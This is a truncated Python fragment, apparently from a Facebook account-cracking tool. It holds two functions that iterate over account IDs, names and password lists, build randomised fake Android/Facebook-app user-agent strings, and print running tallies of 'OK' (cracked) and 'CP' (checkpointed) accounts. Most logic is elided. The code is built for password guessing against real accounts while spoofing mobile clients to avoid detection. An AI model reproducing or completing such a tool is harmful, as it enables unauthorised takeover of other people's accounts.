...
def DHANU_f_m1(ids,names,pswdx):
    try:
        ...
        for passx in pswdx:
            ...
            uaD1 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; X655C Build/TP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845599;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/217716541;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
...
def DHANU_f_m2(ids,names,pswdx):
    try:
        global loop,oks,cps
        sys.stdout.write(f"\r\r {g}[{m}DHANU-M2{g}] {ne}{loop} {k}| {l}OK-{str(len(oks))} {k}| {n}CP-{str(len(cps))} {k} ");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for passx in pswdx:
